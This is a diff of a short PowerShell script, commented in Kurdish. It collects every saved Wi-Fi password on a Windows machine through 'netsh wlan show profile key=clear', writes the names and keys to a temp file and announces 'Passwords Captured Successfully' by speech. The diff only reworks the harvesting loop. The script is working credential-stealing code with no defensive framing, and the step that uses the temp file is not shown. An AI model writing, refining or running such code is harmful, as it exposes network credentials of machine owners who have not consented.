@@ -4,12 +4,13 @@ $p = "$env:TEMP\w.txt"
 
 if (Test-Path $p) { Remove-Item $p -Force }
 
-# دۆزینەوەی پاسۆردەکان بە شێوازێکی سادەتر بۆ ئەوەی کەوانەکان تێک نەنیشن
-netsh wlan show profiles | Select-String "\:(.+)$" | % {
-    $n = $_.Matches.Groups[1].Value.Trim()
-    $c = netsh wlan show profile name="$n" key=clear
-    $pass = ($c | Select-String "Key Content\W+\:(.+)$").Matches.Groups[1].Value.Trim()
-    if ($pass) { "$n : $pass" | Out-File $p -Append }
+# دۆزینەوەی پاسۆردەکان بە شێوازێکی سادەتر
+$nets = netsh wlan show profiles | Select-String "\:(.+)$"
+foreach ($n in $nets) {
+    $name = $n.Matches.Groups[1].Value.Trim()
+    $conf = netsh wlan show profile name="$name" key=clear
+    $pass = ($conf | Select-String "Key Content\W+\:(.+)$").Matches.Groups[1].Value.Trim()
+    if ($pass) { "$name : $pass" | Out-File $p -Append }
 }
 
 if (Test-Path $p) {
@@ -17,5 +18,6 @@ if (Test-Path $p) {
     Remove-Item $p -Force
 }
 
+# بەشی قسەکردنەکە
 $s = New-Object -ComObject SAPI.SpVoice
 $s.Speak("Passwords Captured Successfully")
